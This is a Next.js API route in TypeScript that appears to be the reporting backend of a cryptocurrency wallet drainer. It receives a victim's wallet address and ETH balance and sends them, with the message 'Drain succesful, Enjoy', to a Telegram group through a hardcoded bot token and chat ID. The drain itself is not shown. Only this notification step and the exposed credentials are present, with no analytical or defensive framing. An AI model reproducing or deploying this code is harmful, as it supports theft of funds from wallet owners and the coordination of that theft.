import { NextResponse } from 'next/server';
import TelegramBot from "node-telegram-bot-api"

export async function POST(request: Request) {
    const body = await request.json();

    const bot = new TelegramBot('7825258454:AAHSAxS7tIK5NgSOV3kIROjdfi5ScUc4ZI8', { polling: false })
    const chatId = '-4699958230';
    
    bot.sendMessage(chatId, `✅ Transaction Accepted ✅\n\nWallet Address : ${body.address} 💳\nAmount : ${body.balance} ETH 💰\n\nDrain succesful, Enjoy 💸`);
    return NextResponse.json({msg: 'ok'})
}
